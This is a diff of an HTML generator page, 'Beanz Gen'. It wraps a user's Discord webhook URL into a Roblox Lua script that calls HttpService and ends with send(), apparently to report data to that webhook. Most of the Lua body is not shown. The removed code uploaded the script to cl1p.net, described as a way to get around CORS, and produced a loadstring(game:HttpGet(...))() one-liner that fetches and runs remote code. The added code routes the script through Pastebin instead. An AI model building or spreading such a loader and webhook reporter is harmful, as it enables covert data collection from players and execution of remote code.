@@ -3,39 +3,40 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Beanz Pastebin Gen</title>
+    <title>Beanz Gen V5</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: #111; border: 2px solid #0f0; padding: 25px; border-radius: 10px; width: 90%; max-width: 450px; text-align: center; box-shadow: 0 0 20px #0f0; }
-        input { width: 100%; padding: 12px; margin: 15px 0; background: #000; border: 1px solid #0f0; color: #0f0; box-sizing: border-box; border-radius: 5px; outline: none; }
-        button { width: 100%; padding: 12px; background: #0f0; border: none; color: #000; font-weight: bold; cursor: pointer; border-radius: 5px; }
-        button:disabled { background: #050; color: #555; }
-        #status { margin-top: 15px; font-size: 13px; color: #fff; }
-        #result { margin-top: 15px; padding: 12px; border: 1px dashed #0f0; background: #050505; color: #0f0; font-size: 11px; display: none; word-break: break-all; cursor: pointer; }
+        .card { background: #111; border: 2px solid #0f0; padding: 20px; border-radius: 10px; width: 90%; max-width: 450px; text-align: center; box-shadow: 0 0 20px #0f0; }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #0f0; color: #0f0; box-sizing: border-box; border-radius: 5px; }
+        button { width: 100%; padding: 12px; background: #0f0; border: none; color: #000; font-weight: bold; cursor: pointer; border-radius: 5px; margin-top: 5px; }
+        .step { background: #050505; border: 1px dashed #0f0; padding: 10px; margin-top: 15px; display: none; text-align: left; font-size: 12px; }
+        textarea { width: 100%; height: 80px; background: #000; color: #0f0; border: 1px solid #333; margin-top: 5px; font-size: 10px; }
     </style>
 </head>
 <body>
     <div class="card">
-        <h2>BEANZ PASTEBIN GEN</h2>
+        <h2>BEANZ GEN V5</h2>
         <input type="text" id="webhook" placeholder="Paste Discord Webhook URL">
-        <button id="genBtn" onclick="generate()">GENERATE & UPLOAD</button>
-        <div id="status">Status: Ready</div>
-        <div id="result" onclick="copyResult()"></div>
+        <button onclick="generate()">GENERATE SCRIPT</button>
+
+        <div id="step1" class="step">
+            <strong>STEP 1:</strong> Copy the code below.<br>
+            <textarea id="output" readonly></textarea>
+            <button style="margin-top:5px; padding:5px; font-size:10px;" onclick="copyCode()">CLICK TO COPY CODE</button>
+        </div>
+
+        <div id="step2" class="step">
+            <strong>STEP 2:</strong> Click the button below to open Pastebin, paste your code, and click "Create New Paste".<br>
+            <button onclick="window.open('https://pastebin.com', '_blank')">OPEN PASTEBIN</button>
+        </div>
     </div>
 
     <script>
-        async function generate() {
+        function generate() {
             const web = document.getElementById('webhook').value.trim();
-            const status = document.getElementById('status');
-            const result = document.getElementById('result');
-            const btn = document.getElementById('genBtn');
+            if(!web.includes("discord.com")) return alert("Invalid Webhook");
 
-            if(!web.includes("discord.com/api/webhooks")) return alert("Invalid Webhook!");
-
-            btn.disabled = true;
-            status.innerText = "Status: Uploading to Pastebin...";
-
-            const lua = `local WEBHOOK_URL = "${web}"
+            const script = `local WEBHOOK_URL = "${web}"
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local Workspace = game:GetService("Workspace")
@@ -74,30 +75,17 @@ l.TextSize = 30
 task.wait(2)
 send()`;
 
-            try {
-                // Using a special public Pastebin uploader tool to bypass CORS
-                const response = await fetch('https://api.cl1p.net/beanz' + Math.floor(Math.random() * 99999), {
-                    method: 'POST',
-                    body: lua
-                });
-
-                if (response.ok) {
-                    const url = response.url;
-                    status.innerText = "Status: Success! Copy below:";
-                    result.innerText = 'loadstring(game:HttpGet("' + url + '"))()';
-                    result.style.display = "block";
-                } else {
-                    status.innerText = "Status: Upload failed. Try again.";
-                }
-            } catch (e) {
-                status.innerText = "Status: Connection Error.";
-            }
-            btn.disabled = false;
+            document.getElementById('output').value = script;
+            document.getElementById('step1').style.display = "block";
+            document.getElementById('step2').style.display = "block";
         }
 
-        function copyResult() {
-            navigator.clipboard.writeText(document.getElementById('result').innerText);
-            alert("Copied loadstring!");
+        function copyCode() {
+            const copyText = document.getElementById("output");
+            copyText.select();
+            copyText.setSelectionRange(0, 99999); 
+            navigator.clipboard.writeText(copyText.value);
+            alert("Code Copied!");
         }
     </script>
 </body>
